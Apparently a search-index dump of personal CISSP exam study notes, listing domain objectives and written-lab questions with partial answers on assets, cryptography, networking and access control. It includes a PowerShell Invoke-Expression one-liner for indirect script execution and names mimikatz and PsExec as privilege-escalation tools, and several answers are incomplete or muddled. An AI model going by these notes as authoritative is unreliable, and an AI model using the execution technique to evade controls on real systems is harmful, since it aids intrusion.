<li>What types of sensitive information are stored, processed, or transmitted by the vendor?</li> <li>What controls are in plac to protect the organization's information?</li> <li>........ (p.171)</li> </ul> </li> <li> <p>What are some common steps that employers take to notify employees of system monitoring?</p> <ul> <li>Clauses in employment contracts that state the employee has no expectation of privacy while using corporate equipment.</li> <li>Similar written statements in corporate acceptable use and privacy policies</li> <li>Logon banners warning that all communications are subject to monitoring</li> <li>Warning labels on computers and telephones warning of monitoring</li> </ul> </li> </ol>"}, {"location": "CISSP%20Pre/2-Asset%20Security/0-Overview/", "title": "Domain 2 Asset Security 10%", "text": ""}, {"location": "CISSP%20Pre/2-Asset%20Security/0-Overview/#21-identify-and-classify-information-and-assets", "title": "2.1 Identify and classify information and assets", "text": "<p>Chapter 5</p> <ul> <li>Data classification</li> <li>Asset classification</li> </ul>"}, {"location": "CISSP%20Pre/2-Asset%20Security/0-Overview/#22-establish-information-and-asset-handling-requirements", "title": "2.2 Establish information and asset handling requirements", "text": "<p>Chapter 5</p>"}, {"location": "CISSP%20Pre/2-Asset%20Security/0-Overview/#23-provision-information-and-assets-securely", "title": "2.3 Provision information and assets securely", "text": "<p>Chapter 16</p> <ul> <li>Information and asset ownership</li> <li>Asset inventory (e.g., tangible, intangible)</li> <li>Asset management </li> </ul>"}, {"location": "CISSP%20Pre/2-Asset%20Security/0-Overview/#24-manage-data-lifecycle", "title": "2.4 Manage data lifecycle", "text": "<p>Chapter 5</p> <ul> <li>Data roles (i.e., owners, controllers, custodians, processors, users/subjects)</li> <li>Data collection</li> <li>Data location</li> <li>Data maintenance</li> <li>Data retention</li> <li>Data remanence</li> <li>Data destruction</li> </ul>"}, {"location": "CISSP%20Pre/2-Asset%20Security/0-Overview/#25-ensure-appropriate-asset-retention-eg-end-of-life-eol-end-of-support", "title": "2.5 Ensure appropriate asset retention (e.g., End of Life (EOL), End of Support)", "text": "<p>Chapter 5</p>"}, {"location": "CISSP%20Pre/2-Asset%20Security/0-Overview/#26-determine-data-security-controls-and-compliance-requirements", "title": "2.6 Determine data security controls and compliance requirements", "text": "<p>Chapter 5</p> <ul> <li>Data states (e.g., in use, in transit, at rest)</li> <li>Scoping and tailoring</li> <li>Standards selection</li> <li>Data protection methods (e.g., Digital Rights Management (DRM), data loss prevention (DLP), cloud access security broker (CASB))</li> </ul>"}, {"location": "CISSP%20Pre/2-Asset%20Security/Chapter%205/", "title": "Chapter 5 Protecting Security of Assets", "text": ""}, {"location": "CISSP%20Pre/2-Asset%20Security/Chapter%205/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Describe sensitive data.</p> <p>Sensitive data is any data that isn't public or unclassified.  It includes personally identifiable information (PII), protected health information (PHI), proprietary data, and any other data that an organization needs to protect. PII is any information that can identify an individual.</p> </li> <li> <p>Identify the difference between EOL and EOS.</p> <p>End-of-life (EOL) identifies the date when a vendor plans to stop selling a product. End-of-support (EOS) identifies the date when a vendor plans to stop supporting a product. Organizations should replace products before the EOS date.</p> </li> <li> <p>Identify common uses of pseudonymization, tokenization and anonymization.</p> <ul> <li>Organizations use pseudonymization when they want to create a dataset that they can transfer to others. The new dataset doesn't hold any privacy data. However, the organization still holds the mapping of the pseudonyms and the original data and can reverse the process. </li> <li>Organizations that process credit card data use tokenization. A third party holds the mapping of the token and the credit card data, but the organization doesn't need to maintain the credit card data.</li> <li>Organizations use anonymization to remove all privacy data from a dataset. When this is done correctly, the GDPR no longer applies, but it's often possible to discover the original data.</li> </ul> </li> <li> <p>Describe the difference between scoping and tailoring.</p> <p>Tailoring refers to modifying a list of controls to ensure they align with the mission of the organization. Tailoring includes scoping. Scoping refers to reviewing a list of baseline security controls and selecting only those controls that apply to the IT systems you're trying to protect.</p> </li> </ol>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/", "title": "Domain 3 Security Architecture and Engineering 13%", "text": ""}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#31-research-implement-and-manage-engineering-processes-using-secure-design-principles", "title": "3.1 Research, implement, and manage engineering processes using secure design principles", "text": "<ul> <li> <p>Threat modeling Chapter 1</p> </li> <li> <p>Least privilege Chapter 16</p> </li> <li> <p>Defense in depth Chapter 1</p> </li> <li> <p>Secure defaults Chapter 8</p> </li> <li> <p>Fail securely Chapter 8</p> </li> <li> <p>Segregation of Duties (SoD) Chapter 16</p> </li> <li> <p>Keep it simple and small Chapter 8</p> </li> <li> <p>Zero trust or trust but verify Chapter 8</p> </li> <li> <p>Privacy by design Chapter 8</p> </li> <li> <p>Shared responsibility Chapter 9</p> </li> <li> <p>Secure access service edge ???</p> </li> </ul>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#32-understand-the-fundamental-concepts-of-security-models-eg-biba-star-model-bell-lapadula", "title": "3.2 Understand the fundamental concepts of security models (e.g., Biba, Star Model, Bell-LaPadula)", "text": "<p>Chapter 8</p>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#33-select-controls-based-upon-systems-security-requirements", "title": "3.3 Select controls based upon systems security requirements", "text": "<p>Chapter 8</p>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#34-understand-security-capabilities-of-information-systems-eg-memory-protection-trusted-platform-module-tpm-encryptiondecryption", "title": "3.4 Understand security capabilities of Information Systems (e.g., memory protection, Trusted Platform Module (TPM), encryption/decryption)", "text": "<p>Chapter 8</p>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#35-assess-and-mitigate-the-vulnerabilities-of-security-architectures-designs-and-solution-elements", "title": "3.5 Assess and mitigate the vulnerabilities of security architectures, designs, and solution elements", "text": "<ul> <li> <p>Client-based systems Chapter 9</p> </li> <li> <p>Server-based systems Chapter 9</p> </li> <li> <p>Database systems Chapter 20</p> </li> <li> <p>Cryptographic systems Chapter 7</p> </li> <li> <p>Operational Technology/industrial control systems (ICS) Chapter 9</p> </li> <li> <p>Cloud-based systems (e.g., Software as a Service (SaaS), Infrastructure as a Service (IaaS), Platform as a Service (PaaS))</p> </li> <li> <p>Distributed systems Chapter 16</p> </li> <li> <p>Internet of Things (IoT) Chapter 9</p> </li> <li> <p>Microservices (e.g., application programming interface (API)) Chapter 9</p> </li> <li> <p>Containerization Chapter 9</p> </li> <li> <p>Serverless Chapter 9</p> </li> <li> <p>Embedded systems Chapter 9</p> </li> <li> <p>High-Performance Computing systems Chapter 9</p> </li> <li> <p>Edge computing systems Chapter 9</p> </li> <li> <p>Virtualized systems Chapter 9</p> </li> </ul>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#36-select-and-determine-cryptographic-solutions", "title": "3.6 Select and determine cryptographic solutions", "text": "<ul> <li> <p>Cryptographic life cycle (e.g., keys, algorithm selection) Chapter 6,7</p> </li> <li> <p>Cryptographic methods (e.g., symmetric, asymmetric, elliptic curves, quantum) Chapter 6,7</p> </li> <li> <p>Public key infrastructure (PKI) (e.g., quantum key distribution) Chapter 7</p> </li> <li> <p>Key management practices (e.g., rotation) Chapter 7</p> </li> <li> <p>Digital signatures and digital certificates (e.g., non-repudiation, integrity) Chapter 7</p> </li> </ul>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#37-understand-methods-of-cryptanalytic-attacks", "title": "3.7 Understand methods of cryptanalytic attacks", "text": "<ul> <li> <p>Brute force Chapter 7</p> </li> <li> <p>Ciphertext only Chapter 7</p> </li> <li> <p>Known plaintext Chapter 7</p> </li> <li> <p>Frequency analysis Chapter 7</p> </li> <li> <p>Chosen ciphertext Chapter 7</p> </li> <li> <p>Implementation attacks Chapter 7</p> </li> <li> <p>Side-channel Chapter 7</p> </li> <li> <p>Fault injection Chapter 7</p> </li> <li> <p>Timing Chapter 7</p> </li> <li> <p>Man-in-the-middle (MITM) Chapter 7</p> </li> <li> <p>Pass the hash Chapter 14</p> </li> <li> <p>Kerberos exploitation Chapter 14</p> </li> <li> <p>Ransomware Chapter 21</p> </li> </ul>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#38-apply-security-principles-to-site-and-facility-design", "title": "3.8 Apply security principles to site and facility design", "text": "<p>Chapter 10</p>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#39-design-site-and-facility-security-controls", "title": "3.9 Design site and facility security controls", "text": "<p>Chapter 10</p> <ul> <li>Wiring closets/intermediate distribution frame</li> <li>Server rooms/data centers</li> <li>Media storage facilities</li> <li>Evidence storage</li> <li>Restricted and work area security</li> <li>Utilities and Heating, Ventilation, and Air Conditioning (HVAC)</li> <li>Environmental issues (e.g., natural disasters, man-made)</li> <li>Fire prevention, detection, and suppression</li> <li>Power (e.g., redundant, backup)</li> </ul>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/#310-manage-the-information-system-lifecycle", "title": "3.10 Manage the information system lifecycle (???)", "text": "<ul> <li>Stakeholders needs and requirements</li> <li>Requirements analysis</li> <li>Architectural design</li> <li>Development /implementation</li> <li>Integration</li> <li>Verification and validation</li> <li>Transition/deployment</li> <li>Operations and maintenance/sustainment</li> <li>Retirement/disposal</li> </ul>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%2010/", "title": "Chapter 10 Physical Security Requirements", "text": "<p>Doamin 3 &amp; 7</p>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%2010/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>What kind of device helps to define an organization's perimeter and also serves to deter casual trespassing?</p> <p>Fences, gates, turnstiles, and access control vestibules.</p> </li> <li> <p>What is the problem with halon-based fire suppression technology?</p> <p>Halon degrades into toxic gases at 900 degrees Fahrenheit (482.222 Celsius). Thus, it's not environmentally friendly.</p> </li> <li> <p>What kinds of potential issues can an emergency visit from the fire department leave in its wake?</p> <p>Any time water is used to respond to fire, flame, or smoke, water damage becomes a serious concern, particularly when water is released in areas where electrical equipment is in use.</p> </li> <li> <p>What is CPTED?</p> <p>Crime Prevention Through Environmental Design.</p> </li> <li> <p>What are the three main types of proxmity devices and how do they work?</p> <p>A proximity device can be a passive device, a field-powered device, or a transponder.</p> </li> </ol>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%206/", "title": "Chapter 6 Cryptography and Symmetric Key Algorithms", "text": "<ul> <li>Modulo function is the remainder value left over after a division operation is performed</li> </ul>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%206/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>What is the major hurdle preventing the widespread adoption of one-time pad cryptosystems to ensure data confidentiality?</p> <p>The major hurdle preventing the widespread adoption of one-time pad is the difficulty of generating, distributing, and safeguarding the lengthy keys required.</p> <p>OR</p> <p>The major hurdle preventing the widespread adoption of one-time pad is the difficulty in creating and distributing the very lengthy keys on which the algorithm depends.</p> </li> <li> <p>Encrypt the message \"I will pass the CISSP exam and become certifid next month\" using columnar transposition with the keyword SECURE.</p> <p>ISSMCRDOWSIAEEEMPEEDEFXHLHPHMIETIACXBCITLTSAOTNN</p> </li> <li> <p>Decrypt the message \"FRQJUDWXODWLRQVBRXJRWLW\" using the Caeasar ROT3 substitution cipher.</p> <p>CONGRATULATIONS YOU GOT IT</p> </li> </ol>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%207/", "title": "Chapter 7 PKI and Cryptographic Applications", "text": ""}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%207/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Explain the process Bob should use if he wants to send a confidential message to Alice using asymmetric cryptography.</p> <p>Use Alice's public key to encrypt the message.</p> </li> <li> <p>Explain the process Alice would use to decrypt the message Bob sent in question 1.</p> <p>Use her private key to decrypt the message sent by Bob.</p> </li> <li> <p>Explain the process Bob should use to digitally sign a message to Alice.</p> <p>Bob should generate a message digest from the plaintext message using a hash function. He should then encrypt the message digest using his own private key to create the digital signature. Finally, he should append the digital signature to the message and transmit it to Alice.</p> </li> <li> <p>Explain the process Alice should use to verify the digital signature on the message from Bob in question 3.</p> <p>Alice should decrypt the digital signature in Bob's message using Bob's public key. She should then create a message digest from the plaintext message using the same hashing algorithm Bob used to create the digital signature. Finally, she should compare the two message digests. If they are identical, the signature is authentic.</p> </li> </ol>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%208/", "title": "Chapter 8 Principles of Security Models, Design, and Capabilities", "text": "<p>The tyranny of the default</p> <p>Tyranny in this sentence means a rigorous condition imposed by some outside agency or force (attributed to American historian Dixon Wecter)</p> <p>Zero trust means nothing inside the organization is automatically trusted.</p>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%208/#seven-foundatinal-principles-of-the-privacy-by-design-pbd-framework", "title": "Seven foundatinal principles of the Privacy by Design (PbD) framework", "text": "<ul> <li>Proactive not reactive; preventive not remedial</li> <li>Privacy as the default</li> <li>Privacy embedded into design</li> <li>Full functionality - positive-sum, not zero-sum</li> <li>End-to-end security - full lifecycle protection</li> <li>Visibility and transparency</li> <li>Respect for user privacy</li> </ul>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%208/#several-security-models", "title": "Several security models", "text": "<p>Security models provide a way to formalize sercurity policies. - Trusted computing base - State machine model - Information flow model - Noninterference model - Take-grant model - Access control matrix - Bell-LaPadula model - Biba model - Clark-Wilson model - Brewer and Nash model - Goguen-Meseguer model - Sutherland model - Graham-Denning model - Harrison-Ruzzo-Ullman model - Object-capability model - Lipner's model - Boebert and Kain integrity model - Two-compartment exchange model - Gong's JDK security model - Lee-Shockley model - Jueneman model</p>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%208/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Name at least seven security models and the primary security benefit of using each.</p> </li> <li> <p>Describe the primary components of TCB.</p> <p>TCB stands for trusted computing base. The TCB is a combination of hardware, software, and controls that work together to form a trusted base to enforce your security policy.</p> </li> <li> <p>What are the two primary rules or principles of the Bell-LaPadula security model? Also, what are the two rules of Biba?</p> <p>Bell-LaPadula: the simple rule of no read-up and the star rule of no write-down.</p> <p>Biba: the simple rule of no read-down and the star rule of no write-up.</p> </li> <li> <p>What is the difference between open and closed systems and open and closed source?</p> <p>An open system is one with published APIs that allows third parties to develop products to interact with it. </p> <p>A closed system is one that is proprietary with no third-party product support.</p> <p>Open source is a coding stance that allows others to view the source code of a program.</p> <p>Closed source is an opposing coding stance that keeps source code confidential.</p> </li> <li> <p>Name at least four design principles and describe them.</p> <ol> <li>Secure Defaults</li> <li>Fail Securely</li> <li>Keep it (Stupid) Simple / KISS</li> <li>Zero Trust</li> <li>Privacy by Design (PbD)</li> <li>Trust but verify</li> <li>Threat modeling</li> <li>Defense in depth</li> <li>Least privilege</li> <li>Separation of duties</li> <li>Shared responsibility</li> </ol> </li> </ol>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%209/", "title": "Chapter 9 Security Vulnerabilities, Threats, and Countermeasures", "text": "<p>Process states or operating states are various forms of execution in which a process may run.</p> <p>Applet (mobile code) is a self-contained miniature programs that execute independently of the server that sent them.</p>"}, {"location": "CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%209/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Name three types of ICSs and describe what they do or how they are used.</p> </li> <li> <p>Name the three pairs of aspects or features used to describe storage.</p> </li> <li> <p>Name some vulnerabilities found in distributed architectures.</p> </li> <li> <p>There are numerous server-based technologies that both increase computation and resource access capabilities and also introduce new risks to be managed. Name at least 10 examples of these technologies (over 30 were included in this chapter).</p> </li> <li> <p>In relation to mobile devices, list seven of the potential on-device security features, list the four main deployment models, and list seven of the issues that should be addressed on a mobile device deployment policy.</p> </li> </ol>"}, {"location": "CISSP%20Pre/4-Communication%20and%20Network%20Security/0-Overview/", "title": "Domain 4 Communication and Network Security 13%", "text": ""}, {"location": "CISSP%20Pre/4-Communication%20and%20Network%20Security/0-Overview/#41-apply-secure-design-principles-in-network-architectures", "title": "4.1 Apply secure design principles in network architectures", "text": "<ul> <li> <p>Open System Interconnection (OSI) and Transmission Control Protocol/Internet Protocol (TCP/IP) models Chapter 11</p> </li> <li> <p>Internet Protocol (IP) version 4 and 6 (IPv6) (e.g., unicast, broadcast, multicast, anycast) Chapter 11, 12</p> </li> <li> <p>Secure protocols (e.g., Internet Protocol Security (IPSec), Secure Shell (SSH), Secure Sockets Layer (SSL)/Transport Layer  Security (TLS)) Chapter 11</p> </li> <li> <p>Implications of multilayer protocols Chapter 11</p> </li> <li> <p>Converged protocols (e.g., Internet Small Computer Systems Interface (iSCSI), Voice over Internet Protocol (VoIP),  InfiniBand over Ethernet, Compute Express Link) Chapter 11</p> </li> <li> <p>Transport architecture (e.g., topology, data/control/management plane, cut-through/store-and-forward) Chapter ???</p> </li> <li> <p>Performance metrics (e.g., bandwidth, latency, jitter, throughput, signal-to-noise ratio) Chapter ???</p> </li> <li> <p>Traffic flows (e.g., north-south, east-west) Chapter ???</p> </li> <li> <p>Physical segmentation (e.g., in-band, out-of-band, air-gapped) Chapter ???</p> </li> <li> <p>Logical segmentation (e.g., virtual local area networks (VLANs), virtual private networks (VPNs), virtual routing and  forwarding, virtual domain) Chapter ???</p> </li> <li> <p>Micro-segmentation (e.g., network overlays/encapsulation; distributed firewalls, routers, intrusion detection system  (IDS)/intrusion prevention system (IPS), zero trust) Chapter ???</p> </li> <li> <p>Edge networks (e.g., ingress/egress, peering) Chapter ???</p> </li> <li> <p>Wireless networks (e.g., Bluetooth, Wi-Fi, Zigbee, satellite) Chapter 11</p> </li> <li> <p>Cellular/mobile networks (e.g., 4G, 5G) Chapter 11</p> </li> <li> <p>Content distribution networks (CDN) Chapter 11</p> </li> <li> <p>Software defined networks (SDN), (e.g., application programming interface (API), Software-Defined Wide-Area Network,  network functions virtualization) Chapter ???</p> </li> <li> <p>Virtual Private Cloud (VPC) Chapter ???</p> </li> <li> <p>Monitoring and management (e.g., network observability, traffic flow/shaping, capacity management, fault detection  and handling) Chapter ???</p> </li> </ul>"}, {"location": "CISSP%20Pre/4-Communication%20and%20Network%20Security/0-Overview/#42-secure-network-components", "title": "4.2 Secure network components", "text": "<p>Chapter 11</p> <ul> <li> <p>Operation of infrastructure (e.g., redundant power, warranty, support)</p> </li> <li> <p>Transmission media (e.g., physical security of media, signal propagation quality)</p> </li> <li> <p>Network Access Control (NAC) systems (e.g., physical, and virtual solutions)</p> </li> <li> <p>Endpoint security (e.g., host-based)</p> </li> </ul>"}, {"location": "CISSP%20Pre/4-Communication%20and%20Network%20Security/0-Overview/#43-implement-secure-communication-channels-according-to-design", "title": "4.3 Implement secure communication channels according to design", "text": "<p>Chapter 12</p> <ul> <li> <p>Voice, video, and collaboration (e.g., conferencing, Zoom rooms)</p> </li> <li> <p>Remote access (e.g., network administrative functions)</p> </li> <li> <p>Data communications (e.g., backhaul networks, satellite)</p> </li> <li> <p>Third-party connectivity (e.g., telecom providers, hardware support)</p> </li> </ul>"}, {"location": "CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2011/", "title": "Chapter 11 Secure Network Architecture and Components", "text": "<p>Domain 4 &amp; 7</p>"}, {"location": "CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2011/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Name the layers of the OSI model and their numbers from top to bottom.</p> <ul> <li> <p>Layer 7: Application</p> </li> <li> <p>Layer 6: Presentation</p> </li> <li> <p>Layer 5: Session</p> </li> <li> <p>Layer 4: Transport</p> </li> <li> <p>Layer 3: Network</p> </li> <li> <p>Layer 2: Data Link</p> </li> <li> <p>Layer 1: Physical</p> </li> </ul> </li> <li> <p>Name three problems with cabling and the methods to counteract those issues.</p> <ul> <li>Attenuation (use repeaters or don't violate distance recommendations).</li> <li>Using the wrong category of cable (check the cable specifications against throughput requirements, and err on the side of caution).</li> <li>Interference (use cable shielding, use cables with higher twists per inch, or switch to fiber-optic cables).</li> <li>Eavesdropping (maintain physical security over all cable runs or switch to fiber-optic cables).</li> </ul> </li> <li> <p>What are the various technologies employed by wireless devices to maximize their use of the available radio frequencies?</p> <p>Some of the frequency spectrum-use technologies are spread spectrum, Frequency Hopping Spread Spectrum (FHSS), Direct Sequence Spread Spectrum (DSSS), and Orthogonal Frequency-Division Multiplexing (OFDM).</p> </li> <li> <p>Discuss methods used to secure 802.11 wireless networking.</p> <p>p.531</p> </li> <li> <p>Name eight Application-layer protocols and their ports (indicate whether the ports are TCP or UDP).</p> <p>p.506</p> </li> </ol>"}, {"location": "CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2012/", "title": "Chapter 12 Secure Communications and Network Attacks", "text": ""}, {"location": "CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2012/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Describe the differences between transport mode and tunnel mode of VPNs.</p> <p>p.605</p> </li> <li> <p>Dicuss the benefits of NAT.</p> <p>p.614</p> </li> <li> <p>What are the main differences between circuit switching and packet switching?</p> <p>p.620</p> <p>Circuit switching is usually associated with physical connections. The link itself is physically established and then dismantled for the communication. Packet switching is usually associated with logical connections because the link is just a logically defined path among possible paths.</p> </li> <li> <p>What are some security issues with email and options for safeguarding against them?</p> <p>Email is inherently insecure because it is primarily a plaintext communication medium and employs nonencrypted transmission protocols. This allows email to be easily spoofed, spammed, flooded, eavesdropped on, interfered with, and hijacked. Defemses against these issues primarily include having stronger authentication requirements and using encryption to protect the content while in transit.</p> </li> <li> <p>What are the private IP addresses, APIPA addresses, and loopback addresses?</p> <ul> <li> <p>private IP addresses:</p> <ul> <li>10.0.0.0 - 10.255.255.255 (a full Class A ranges)</li> <li>172.16.0.0 - 172.31.255.255 (16 Class B ranges)</li> <li>192.168.0.0 - 192.168.255.255 (256 Class C ranges)</li> </ul> </li> <li> <p>Automatic Private IP Addressing (APIPA)</p> <p>APIPA assigns each failed DHCP client with an IP address from the range of 169.254.0.1 to 169.254.255.254 along with the default Class B subnet mask of 255.255.0.0.      * loopback addresses</p> <p>Technically, the entire 127.0.0.0/8 network is reserved for loopback use in IPv4. However, only the 127.0.0.1 address is widely used.</p> </li> </ul> </li> <li> <p>Name at least six facts about VLANs.</p> <p>p.610</p> </li> </ol>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/", "title": "Domain 5 Identity and Access Management (IAM) 13%", "text": ""}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/#51-control-physical-and-logical-access-to-assets", "title": "5.1 Control physical and logical access to assets", "text": "<p>Chapter 13</p> <ul> <li>Information</li> <li>Systems</li> <li>Devices</li> <li>Facilities</li> <li>Applications</li> <li>Services (????)</li> </ul>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/#52-design-identification-and-authentication-strategy-eg-people-devices-and-services", "title": "5.2 Design identification and authentication strategy (e.g., people, devices, and services)", "text": "<p>Chapter 13</p> <ul> <li>Groups and Roles (???)</li> <li> <p>Authentication, Authorization and Accounting (AAA) (e.g., multi-factor authentication (MFA), password-less authentication) </p> <p>(????)</p> </li> <li> <p>Session management</p> </li> <li>Registration, proofing, and establishment of identity</li> <li>Federated Identity Management (FIM)</li> <li>Credential management systems (e.g., Password vault)</li> <li>Single sign-on (SSO)</li> <li>Just-In-Time</li> </ul>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/#53-federated-identity-with-a-third-party-service", "title": "5.3 Federated identity with a third-party service", "text": "<p>Chapter 13</p> <ul> <li>On-premise</li> <li>Cloud</li> <li>Hybrid</li> </ul>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/#54-implement-and-manage-authorization-mechanisms", "title": "5.4 Implement and manage authorization mechanisms", "text": "<p>Chapter 14</p> <ul> <li>Role-based access control (RBAC)</li> <li>Rule based access control</li> <li>Mandatory access control (MAC)</li> <li>Discretionary access control (DAC)</li> <li>Attribute-based access control (ABAC)</li> <li>Risk based access control</li> <li> <p>Access policy enforcement (e.g., policy decision point, policy enforcement point)</p> <p>????</p> </li> </ul>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/#55-manage-the-identity-and-access-provisioning-lifecycle", "title": "5.5 Manage the identity and access provisioning lifecycle", "text": "<ul> <li> <p>Account access review (e.g., user, system, service) Chapter 13</p> </li> <li> <p>Provisioning and deprovisioning (e.g., on/off boarding and transfers) Chapter 13</p> </li> <li> <p>Role definition and transition (e.g., people assigned to new roles) Chapter 13</p> </li> <li> <p>Privilege escalation (e.g., use of sudo, auditing its use) Chapter 14</p> </li> <li> <p>Service accounts management Chapter 14</p> </li> </ul>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/#56-implement-authentication-systems", "title": "5.6 Implement authentication systems", "text": "<p>Chapter 14</p>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2013/", "title": "Chapter 13 Managing Identity and Authentication", "text": ""}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2013/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>List some physical and logical access controls used to protect assets.</p> <p>p.640</p> </li> <li> <p>Describe the differences between identification, authentication, authorization, and accountability.</p> </li> <li> <p>Describe the three primary authentication factor types.</p> <p>Something you know; something you have; and something you are.</p> </li> <li> <p>Name the method that allows users to log on once and access resources in multiple organizations without authenticating again.</p> <p>Single sign on.</p> </li> <li> <p>Identify the processes an organization follows when hiring an employee and when an employee leaves.</p> <p>Provisioning and onboarding</p> <p>Deprovisioning and offboarding</p> </li> </ol>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2014/", "title": "Chapter 14 Controlling and Monitoring Access", "text": "<p>Domain 3 &amp; 5</p>"}, {"location": "CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2014/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Describe the primary difference between discretionary and nondiscretionary access control models.</p> <p>The primary difference between discretionary and nondiscretionary access control models is in how they are controlled and managed. Administrators centrally administer nondiscretionary access controls. DAC models allow owners to make their own changes, and their changes don't affect other parts of the environment.</p> </li> <li> <p>List at least three standards used to provide single sign-on (SSO) capabilities on the internet.</p> <p>Security Assertion Markup Language (SAML), OAuth, OpenID, and OpenID Connect (OIDC).</p> </li> <li> <p>Identify the PowerShell cmdlet that allows you to run Powershell commands indirectly.</p> <p><code>powershell.exe \"&amp; {Get-Content .\\hello.ps1 | Invoke-Expression}\"</code></p> </li> <li> <p>Name a tool that is commonly used in the pass-the-hash and Kerberos exploitation attacks for privilege escalation.</p> <p>mimikatz, PsExec.</p> </li> </ol>"}, {"location": "CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/", "title": "Domain 6 Security Assessment and Testing 12%", "text": ""}, {"location": "CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/#61-design-and-validate-assessment-test-and-audit-strategies", "title": "6.1 Design and validate assessment, test, and audit strategies", "text": "<ul> <li>Internal (e.g., within organization control)</li> <li>External (e.g., outside organization control)</li> <li>Third-party (e.g., outside of enterprise control)</li> <li>Location (e.g., on-premise, cloud, hybrid)</li> </ul>"}, {"location": "CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/#62-conduct-security-controls-testing", "title": "6.2 Conduct security controls testing", "text": "<ul> <li>Vulnerability assessment</li> <li>Penetration testing (e.g., red, blue, and/or purple team exercises)</li> <li>Log reviews</li> <li>Synthetic transactions/benchmarks</li> <li>Code review and testing</li> <li>Misuse case testing</li> <li>Coverage analysis</li> <li>Interface testing (e.g., user interface, network interface, application programming interface (API))</li> <li>Breach attack simulations</li> <li>Compliance checks</li> </ul>"}, {"location": "CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/#63-collect-security-process-data-eg-technical-and-administrative", "title": "6.3 Collect security process data (e.g., technical, and administrative)", "text": "<ul> <li>Account management</li> <li>Management review and approval</li> <li>Key performance and risk indicators</li> <li>Backup verification data</li> <li>Training and awareness</li> <li>Disaster recovery (DR) and Business Continuity (BC)</li> </ul>"}, {"location": "CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/#64-analyze-test-output-and-generate-report", "title": "6.4 Analyze test output and generate report", "text": "<ul> <li>Remediation</li> <li>Exception handling</li> <li>Ethical disclosure</li> </ul>"}, {"location": "CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/#65-conduct-or-facilitate-security-audits", "title": "6.5 Conduct or facilitate security audits", "text": "<ul> <li>Internal (e.g., within organization control)</li> <li>External (e.g., outside organization control)</li> <li>Third-party (e.g., outside of enterprise control)</li> <li>Location (e.g., on-premise, cloud, hybrid)</li> </ul>"}, {"location": "CISSP%20Pre/6-Security%20Assessment%20and%20Testing/Chapter%2015/", "title": "Chapter 15 Security Assessment and Testing", "text": "<p>Domain 6 &amp; 8</p>"}, {"location": "CISSP%20Pre/6-Security%20Assessment%20and%20Testing/Chapter%2015/#written-lab", "title": "Written Lab", "text": "<ol> <li> <p>Describe the difference between TCP SYN scanning and TCP connect scanning.</p> <p>p.733</p> </li> <li> <p>What are the three port status values returned by the nmap network discovery scanning tool?</p> <p>Open, closed, and filtered.</p> </li> <li> <p>What is the difference between static and dynamic code testing techniques?</p> <ul> <li> <p>Static testing techniques, such as code reviews, evaluate the security of software without running it by analyzing either the source code or the compiled 